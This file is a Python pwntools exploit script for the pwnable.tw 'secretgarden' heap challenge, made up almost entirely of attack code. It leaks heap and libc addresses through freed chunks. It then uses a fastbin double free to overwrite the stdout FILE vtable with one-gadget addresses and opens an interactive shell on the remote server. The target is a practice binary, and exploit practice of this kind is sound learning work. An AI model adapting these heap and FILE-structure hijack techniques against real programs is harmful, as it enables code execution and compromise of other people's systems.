from pwn import *

def Raise(size, name, color):
	p.recvuntil("Your choice : ")
	p.send('1')
	p.recvuntil("Length of the name :")
	p.sendline(str(size))
	p.recvuntil("The name of flower :")
	p.send(name)
	p.recvuntil("The color of the flower :")
	p.sendline(color)
	p.recvuntil('Successful !\n')

def Visit(idx):
	p.recvuntil("Your choice : ")
	p.send('2')
	p.recvuntil("Name of the flower[%d] :"%idx)
	res = dict()
	res['name'] = p.recvuntil('\n')[:-1]
	p.recvuntil("Color of the flower[%d] :"%idx)
	res['color'] = p.recvuntil('\n')[:-1]
	return res

def Remove(idx):
	p.recvuntil("Your choice : ")
	p.send('3')
	p.recvuntil("Which flower do you want to remove from the garden:")
	p.sendline(str(idx))
	p.recvuntil("Successful\n")

def Clean():
	p.recvuntil("Your choice : ")
	p.send('4')
	p.recvuntil("Done!\n")

if __name__ == '__main__':
#p = process("./secretgarden", env={"LD_PRELOAD":"./libc_64.so.6"})
	p = remote("chall.pwnable.tw", 10203)
	elf = ELF("./secretgarden")
	libc = ELF("./libc_64.so.6")
	
	####################### [HEAP LEAK] #######################
	Raise(256,"A"*16,"B"*16)
	Raise(256,"C"*16,"D"*16)
	Raise(256,"E"*16,"F"*16)
	Raise(256,"G"*16,"H"*16)

	Remove(0)
	Remove(1)
	Remove(2)
	Remove(3)
	
	Raise(256,"A"*8,"B"*16)

	data = Visit(4)['name']
	data = data[8:]
	leak = u64(data.ljust(8,'\x00'))
	heap_base = leak - 0x12c0
	
	Remove(0)
	Clean()

	print "[Heap] : 0x%x" % heap_base
	pause()

	####################### [LIBC LEAK] #######################
	Raise(256,"A"*8,"B"*16)

	data = Visit(0)['name']
	data = data[8:]
	leak = u64(data.ljust(8,'\x00'))

	libc_base = leak - 0x3c3b78 - 0x100
	print "[Libc] : 0x%x" % libc_base
	pause()

	####################### [Exploit] #######################
	malloc_hook = libc_base + 0x3C3B10
	oneshot = libc_base + 0x4526a
	at_exit = libc_base + 0x3C08D8
	_IO_list_all = libc_base + 0x3C4520
	_IO_file_jump_addr = libc_base + 0x3c26e0
	_IO_stdout = libc_base + 0x3C4620
	fake_chunk_addr = heap_base + 0x12d0

	Remove(0)
	Clean()

	Raise(90,"A"*4,"B"*4)
	Raise(90,"C"*4,"D"*4)
	'''
	_IO_file_jump = p64(0)*2
	_IO_file_jump += p64(libc_base + 0x799C0) # _IO_file_finish
	_IO_file_jump += p64(libc_base + 0x7A730) # _IO_file_overflow
	_IO_file_jump += p64(libc_base + 0x79610) # sub_79610
	_IO_file_jump += p64(libc_base + 0x7B600) # _IO_default_uflow
	_IO_file_jump += p64(libc_base + 0x7C980) # _IO_default_pbackfail
	_IO_file_jump += p64(oneshot)				# _IO_file_xsputn
	'''
	_IO_file_jump = p64(oneshot) * 19

	Raise(256, _IO_file_jump, "COLOR")
	
	Remove(0)
	Remove(1)
	Remove(0)

	context.log_level='debug'
	
	Raise(90,p64(_IO_stdout + 0xd8 - 59), "A")
	Raise(90,"A","C")
	Raise(90,"A","C")
	
	p.recvuntil("Your choice : ")
	p.send('1')
	p.recvuntil("Length of the name :")
	p.sendline("90")
	p.recvuntil("The name of flower :")

	pay = '\x00' * 13 + p64(0xffffffff) + p64(0)*2 + "\x00"*6 + p64(fake_chunk_addr)

	p.send(pay)
	p.interactive()


